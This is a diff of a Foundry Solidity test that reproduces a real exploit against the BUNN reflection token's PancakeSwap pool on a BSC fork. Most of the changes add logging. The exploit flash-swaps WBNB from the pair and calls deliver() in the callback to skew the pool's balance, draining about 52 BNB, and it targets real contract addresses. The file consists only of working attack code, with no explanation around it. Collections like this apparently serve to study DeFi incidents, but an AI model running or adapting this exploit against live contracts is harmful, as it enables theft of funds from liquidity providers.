@@ -16,27 +16,42 @@ interface Bunn is IERC20 {
 }
 
 contract ContractTest is Test {
+
     IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Bunn constant BUNN = Bunn(0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039);
     IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IPancakePair constant Bunn_Wbnb_Poll = IPancakePair(0xb4B84375Ae9bb94d19F416D3db553827Be349520);
 
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 29_304_627);
+        cheats.createSelectFork("bsc", 29304627);
     }
 
     function testExploit() external {
-        Bunn_Wbnb_Poll.swap(44 ether, 1_000_000_000_000, address(this), "0x0"); //44 bnb profit
-        Bunn_Wbnb_Poll.swap(8 ether, 1_000_000_000_000, address(this), "0x0"); // 8 bnb profit
+        uint112 r0;
+        uint112 r1;
+        (r0, r1,) = Bunn_Wbnb_Poll.getReserves();
+        console2.log("r0 = %d, r1 = %d", r0, r1);
+        console2.log("LP totalSupply = ", Bunn_Wbnb_Poll.totalSupply());
 
-        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
+        Bunn_Wbnb_Poll.swap(44 ether,1_000_000_000_000,address(this),'0x0'); //44 bnb profit
+        Bunn_Wbnb_Poll.swap(8 ether,1_000_000_000_000,address(this),'0x0'); // 8 bnb profit
+
+        emit log_named_decimal_uint(
+            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18
+        );
+        emit log_named_decimal_uint(
+            "[End] PAIR WBNB balance after exploit", WBNB.balanceOf(address(Bunn_Wbnb_Poll)), 18
+        );
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        console.log("Before deliver,pair WBNB balance:", WBNB.balanceOf(address(Bunn_Wbnb_Poll)));
         console.log("Before deliver,pair bunn balance:", BUNN.balanceOf(address(Bunn_Wbnb_Poll)));
         BUNN.deliver(990_000_000_000);
+        console.log("After deliver,pair WBNB balance:", WBNB.balanceOf(address(Bunn_Wbnb_Poll)));
         console.log("After deliver,pair bunn balance:", BUNN.balanceOf(address(Bunn_Wbnb_Poll)));
     }
 }
